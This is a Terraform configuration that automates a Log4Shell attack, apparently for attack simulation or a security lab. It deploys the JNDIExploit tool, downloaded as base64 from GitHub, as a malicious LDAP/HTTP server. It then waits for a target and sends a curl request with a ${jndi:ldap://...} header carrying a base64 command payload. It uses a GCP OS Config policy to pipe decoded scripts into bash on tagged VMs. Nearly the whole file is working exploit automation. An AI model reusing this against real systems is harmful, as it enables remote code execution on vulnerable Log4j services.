locals {
    jdniexploit_url="https://github.com/credibleforce/jndi/raw/main/jndi.base64"
    image = "openjdk:11"
    name = "jdniexploit"
    attacker_http_port=var.attacker_http_port
    attacker_ldap_port=var.attacker_ldap_port
    attacker_ip=var.attacker_ip
    target_ip=var.target_ip
    target_port=var.target_port
    base64_log4shell_payload=base64encode(
        var.payload
    )
    command_payload=<<-EOT
    bash -c "wget ${local.jdniexploit_url} && base64 -d jndi.base64 > JNDIExploit.1.2.zip && unzip JNDIExploit.*.zip && rm *.zip && java -jar JNDIExploit-*.jar --ip ${local.attacker_ip} --httpPort ${local.attacker_http_port} --ldapPort ${local.attacker_ldap_port}"
    EOT
    payload = <<-EOT
    LOGFILE=/tmp/${var.tag}.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    truncate -s 0 $LOGFILE
    log "Checking for docker..."
    while ! which docker > /dev/null || ! docker ps > /dev/null; do
        log "docker not found or not ready - waiting"
        sleep 120
    done
    log "docker path: $(which docker)"
    if [[ `sudo docker ps | grep ${local.name}` ]]; then docker stop ${local.name}; fi
    log "$(echo 'docker run -d --name ${local.name} --rm -p ${local.attacker_http_port}:${local.attacker_http_port} -p ${local.attacker_ldap_port}:${local.attacker_ldap_port} ${local.image} ${local.command_payload}')"
    docker run -d --name ${local.name} --rm -p ${local.attacker_http_port}:${local.attacker_http_port} -p ${local.attacker_ldap_port}:${local.attacker_ldap_port} ${local.image} ${local.command_payload} >> $LOGFILE 2>&1
    docker ps -a >> $LOGFILE 2>&1
    log "payload: curl --verbose ${local.target_ip}:${local.target_port} -H 'X-Api-Version: $${jndi:ldap://${local.attacker_ip}:${local.attacker_ldap_port}/Basic/Command/Base64/${local.base64_log4shell_payload}}'"
    log "checking target: ${local.target_ip}:${local.target_port}"
    while ! nc -z -w 5 -vv ${local.target_ip} ${local.target_port} > /dev/null; do
        log "failed check - waiting for target";
        sleep 30;
    done;
    log "target available - sending payload";
    sleep 5;
    curl --verbose ${local.target_ip}:${local.target_port} -H 'X-Api-Version: $${jndi:ldap://${local.attacker_ip}:${local.attacker_ldap_port}/Basic/Command/Base64/${local.base64_log4shell_payload}}' >> $LOGFILE 2>&1;
    echo "\n" >> $LOGFILE
    log "payload sent sleeping..."
    log "done";
    EOT
    base64_payload = base64encode(local.payload)
}

#####################################################
# GCP OSCONFIG
#####################################################

locals {
    resource_name = "${replace(var.tag, "_", "-")}-${var.environment}-${var.deployment}-${random_string.this.id}"
}



resource "random_string" "this" {
    length            = 4
    special           = false
    upper             = false
    lower             = true
    numeric           = true
}

data "google_compute_zones" "available" {
  project     = var.gcp_project_id
  region    = var.gcp_location
}

resource "google_os_config_os_policy_assignment" "this" {

  project     = var.gcp_project_id
  location    = data.google_compute_zones.available.names[0]
  
  name        = "${local.resource_name}"
  description = "Attack automation"
  skip_await_rollout = true
  
  instance_filter {
    all = false

    inclusion_labels {
      labels = jsondecode(<<-EOT
                            { 
                              "${var.tag}": "true",
                              "deployment": "${var.deployment}",
                              "environment": "${var.environment}"
                            }
                            EOT
                          )
    }

    inventories {
      os_short_name = "ubuntu"
    }

    inventories {
      os_short_name = "debian"
    }

  }

  os_policies {
    id        = "${local.resource_name}"
    mode = "ENFORCEMENT"

    resource_groups {
      resources {
        id = "run"
        exec {
          validate {
            interpreter      = "SHELL"
            output_file_path = "$HOME/os-policy-tf.out"
            script           = "/bin/bash -c 'echo ${local.base64_payload} | tee /tmp/payload_${var.tag} | base64 -d | /bin/bash - &' && exit 100"
          }
          enforce {
            interpreter      = "SHELL"
            output_file_path = "$HOME/os-policy-tf.out"
            script           = "exit 100"
          }
        }
      }
    }
  }

  rollout {
    disruption_budget {
      percent = 50
    }
    min_wait_duration = var.timeout
  }
}